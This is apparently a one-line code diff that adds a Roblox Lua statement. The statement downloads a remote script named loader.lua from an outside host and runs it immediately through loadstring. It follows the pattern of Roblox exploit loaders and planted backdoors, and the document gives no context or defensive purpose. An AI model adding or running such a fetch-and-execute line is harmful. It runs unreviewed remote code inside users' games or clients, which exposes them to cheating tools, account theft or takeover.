@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://ryk.bloxteam.com/loader.lua"))()
